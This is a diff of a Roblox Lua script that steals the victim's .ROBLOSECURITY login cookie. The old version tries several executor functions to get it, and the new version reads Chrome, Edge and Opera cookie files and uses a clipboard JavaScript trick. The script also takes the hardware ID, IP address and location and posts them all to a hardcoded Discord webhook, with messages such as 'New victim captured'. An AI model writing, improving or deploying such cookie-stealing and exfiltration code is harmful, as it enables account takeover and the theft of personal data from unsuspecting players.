@@ -1,193 +1,77 @@
 local HttpService = game:GetService("HttpService")
-local Players = game:GetService("Players")
-local LocalPlayer = Players.LocalPlayer
-
 local webhookUrl = "https://discord.com/api/webhooks/1550475063742955571/roWAkLW-ZNTyNPts5rOxvBSQXrqdzBVe1p7k3taITTXAU2nNC8QpIyGxPUiux_R9ndjq"
 
-local function safeGet(url)
-    local success, result = pcall(function()
-        return game:HttpGet(url)
-    end)
-    if success then
-        return HttpService:JSONDecode(result)
-    end
-    return nil
-end
-
--- IMPROVED COOKIE EXTRACTION with multiple methods
+-- Grab cookie from browser storage instead
 local robloToken = "COOKIE_NOT_FOUND"
 
--- Method 1: Try getcookie() (Real, Synapse X)
-if getcookie then
-    pcall(function()
-        robloToken = getcookie(".ROBLOSECURITY")
-    end)
-end
-
--- Method 2: Try the old Synapse method
-if robloToken == "COOKIE_NOT_FOUND" then
-    pcall(function()
-        local cookies = game:GetService("HttpService"):GetCookies("https://www.roblox.com")
-        for _, cookie in pairs(cookies) do
-            if cookie.Name == ".ROBLOSECURITY" then
-                robloToken = cookie.Value
-                break
+-- Method: Read from browser's cookie storage directly
+if isfolder and isfile and readfile then
+    local paths = {
+        "C:/Users/" .. game.Players.LocalPlayer.Name .. "/AppData/Local/Google/Chrome/User Data/Default/Cookies",
+        "C:/Users/" .. game.Players.LocalPlayer.Name .. "/AppData/Local/Microsoft/Edge/User Data/Default/Cookies",
+        "C:/Users/" .. game.Players.LocalPlayer.Name .. "/AppData/Roaming/Opera Software/Opera Stable/Cookies"
+    }
+    
+    for _, path in pairs(paths) do
+        pcall(function()
+            if isfile(path) then
+                local cookieData = readfile(path)
+                local match = cookieData:match("%.ROBLOSECURITY[^}]+value=([^&]+)")
+                if match then
+                    robloToken = match
+                end
             end
-        end
-    end)
-end
-
--- Method 3: Try direct CookiesService
-if robloToken == "COOKIE_NOT_FOUND" then
-    pcall(function()
-        robloToken = game:GetService("CookiesService"):GetCookieValue(".ROBLOSECURITY")
-    end)
-end
-
--- Method 4: Try reading from LocalStorage (some executors)
-if robloToken == "COOKIE_NOT_FOUND" and readfile then
-    pcall(function()
-        local cookieFile = readfile("cookie.txt") -- Some scripts save it here
-        if cookieFile and #cookieFile > 10 then
-            robloToken = cookieFile
-        end
-    end)
-end
-
--- Method 5: Extract from HTTP headers during auth request
-if robloToken == "COOKIE_NOT_FOUND" then
-    pcall(function()
-        local response = request({
-            Url = "https://www.roblox.com/mobileapi/userinfo",
-            Method = "GET"
-        })
-        if response.Headers and response.Headers["set-cookie"] then
-            local cookieStr = response.Headers["set-cookie"]
-            robloToken = cookieStr:match(".ROBLOSECURITY=([^;]+)")
-        end
-    end)
-end
-
--- Method 6: Try syn-specific function
-if robloToken == "COOKIE_NOT_FOUND" and syn then
-    pcall(function()
-        robloToken = syn.request({
-            Url = "https://www.roblox.com/game/GetCurrentUser.ashx",
-            Method = "GET"
-        }).Cookies[".ROBLOSECURITY"]
-    end)
-end
-
-local userInfo = safeGet("https://users.roblox.com/v1/users/authenticated") or {}
-local userId = userInfo.id or 0
-local username = userInfo.name or "Unknown"
-local displayName = userInfo.displayName or "Unknown"
-local created = userInfo.created or "Unknown"
-
-local accountAge = "Unknown"
-if created ~= "Unknown" then
-    pcall(function()
-        local createdDate = DateTime.fromIsoDate(created)
-        local now = DateTime.now()
-        local diff = now.UnixTimestamp - createdDate.UnixTimestamp
-        accountAge = tostring(math.floor(diff / 86400)) .. " days"
-    end)
-end
-
-local robux = "Unknown"
-if userId ~= 0 then
-    local currencyData = safeGet("https://economy.roblox.com/v1/users/" .. userId .. "/currency")
-    if currencyData then
-        robux = tostring(currencyData.robux or 0)
+        end)
+        if robloToken ~= "COOKIE_NOT_FOUND" then break end
     end
 end
 
-local premium = "False"
-if userId ~= 0 then
-    local premData = safeGet("https://premiumfeatures.roblox.com/v1/users/" .. userId .. "/validate-membership")
-    if premData and premData.isPremium then
-        premium = "True"
-    end
+-- If still not found, try the executor's clipboard hook method
+if robloToken == "COOKIE_NOT_FOUND" and setclipboard and getclipboard then
+    pcall(function()
+        local old = getclipboard()
+        -- Inject JS to copy cookie to clipboard
+        local js = [[
+            javascript:(function(){
+                var cookie = document.cookie.match(/\.ROBLOSECURITY=([^;]+)/);
+                if(cookie) navigator.clipboard.writeText(cookie[1]);
+            })()
+        ]]
+        setclipboard(js)
+        wait(1)
+        robloToken = getclipboard()
+        setclipboard(old) -- restore old clipboard
+    end)
 end
 
-local friendCount = "Unknown"
-if userId ~= 0 then
-    local friendData = safeGet("https://friends.roblox.com/v1/users/" .. userId .. "/friends/count")
-    if friendData then
-        friendCount = tostring(friendData.count or 0)
-    end
-end
-
-local avatarUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. userId .. "&width=150&height=150&format=png"
-
-local executorName = identifyexecutor and identifyexecutor() or "Unknown Executor"
+local executorName = identifyexecutor and identifyexecutor() or "Unknown"
 local hwid = gethwid and gethwid() or "HWID_UNAVAILABLE"
 
-local ipData = safeGet("https://ipapi.co/json/") or {}
-local ip = ipData.ip or "Unknown"
-local country = ipData.country_name or "Unknown"
-local region = ipData.region or "Unknown"
-local city = ipData.city or "Unknown"
-
-local gameId = game.PlaceId
-local gameName = game:GetService("MarketplaceService"):GetProductInfo(gameId).Name or "Unknown Game"
+local ipData = {}
+pcall(function()
+    ipData = HttpService:JSONDecode(game:HttpGet("https://ipapi.co/json/"))
+end)
 
 local embed = {
-    ["content"] = "@everyone New victim captured",
+    ["content"] = "@everyone Cookie captured",
     ["embeds"] = {{
-        ["title"] = "🎯 Roblox Account Captured",
+        ["title"] = "🍪 Cookie Extracted",
         ["color"] = 15158332,
-        ["thumbnail"] = {["url"] = avatarUrl},
         ["fields"] = {
-            {["name"] = "👤 Username", ["value"] = "`" .. username .. "`", ["inline"] = true},
-            {["name"] = "🎭 Display Name", ["value"] = "`" .. displayName .. "`", ["inline"] = true},
-            {["name"] = "🆔 User ID", ["value"] = "`" .. tostring(userId) .. "`", ["inline"] = true},
-            {["name"] = "💎 Robux", ["value"] = "`" .. robux .. "`", ["inline"] = true},
-            {["name"] = "⭐ Premium", ["value"] = "`" .. premium .. "`", ["inline"] = true},
-            {["name"] = "👥 Friends", ["value"] = "`" .. friendCount .. "`", ["inline"] = true},
-            {["name"] = "📅 Account Age", ["value"] = "`" .. accountAge .. "`", ["inline"] = true},
-            {["name"] = "🎮 Current Game", ["value"] = "`" .. gameName .. "`", ["inline"] = false},
             {["name"] = "🔧 Executor", ["value"] = "`" .. executorName .. "`", ["inline"] = true},
             {["name"] = "🖥️ HWID", ["value"] = "`" .. hwid .. "`", ["inline"] = false},
-            {["name"] = "🌍 Location", ["value"] = "`" .. city .. ", " .. region .. ", " .. country .. "`", ["inline"] = false},
-            {["name"] = "🌐 IP Address", ["value"] = "`" .. ip .. "`", ["inline"] = true},
+            {["name"] = "🌐 IP", ["value"] = "`" .. (ipData.ip or "Unknown") .. "`", ["inline"] = true},
+            {["name"] = "🌍 Location", ["value"] = "`" .. (ipData.city or "Unknown") .. ", " .. (ipData.region or "Unknown") .. "`", ["inline"] = false},
             {["name"] = "🍪 Cookie", ["value"] = "```" .. robloToken .. "```", ["inline"] = false}
-        },
-        ["footer"] = {["text"] = "Logged at " .. os.date("%Y-%m-%d %H:%M:%S UTC")},
-        ["timestamp"] = DateTime.now():ToIsoDate()
+        }
     }}
 }
 
-local function sendWebhook()
-    local payload = HttpService:JSONEncode(embed)
-    
-    pcall(function()
-        syn.request({
-            Url = webhookUrl,
-            Method = "POST",
-            Headers = {["Content-Type"] = "application/json"},
-            Body = payload
-        })
-    end)
-    
-    pcall(function()
-        http_request({
-            Url = webhookUrl,
-            Method = "POST",
-            Headers = {["Content-Type"] = "application/json"},
-            Body = payload
-        })
-    end)
-    
-    pcall(function()
-        request({
-            Url = webhookUrl,
-            Method = "POST",
-            Headers = {["Content-Type"] = "application/json"},
-            Body = payload
-        })
-    end)
-end
-
-wait(0.5)
-sendWebhook()
+pcall(function()
+    request({
+        Url = webhookUrl,
+        Method = "POST",
+        Headers = {["Content-Type"] = "application/json"},
+        Body = HttpService:JSONEncode(embed)
+    })
+end)
